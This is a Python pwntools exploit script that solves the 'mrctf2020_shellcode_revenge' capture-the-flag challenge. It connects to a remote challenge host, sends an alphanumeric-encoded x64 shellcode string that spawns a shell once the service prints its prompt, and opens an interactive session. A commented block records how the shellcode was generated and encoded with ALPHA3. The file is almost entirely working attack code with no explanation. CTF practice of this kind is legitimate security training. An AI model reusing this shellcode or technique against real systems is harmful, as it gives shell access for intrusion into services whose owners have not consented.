from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('mrctf2020_shellcode_revenge')
io = remote('node4.buuoj.cn', 27645)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.27.so')
elf = ELF('mrctf2020_shellcode_revenge')

'''
shellcode = asm(shellcraft.sh())
f = open("shellcode_amd64.bin", 'wb')
f.write(shellcode)
f.close()
# python ~/Downloads/alpha3/ALPHA3.py x64 ascii mixedcase rax --input="shellcode_amd64.bin" > shellcode_amd64_encode.bin
'''
shellcode  = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"
io.sendafter('Show me your magic!\n', shellcode)
io.interactive()
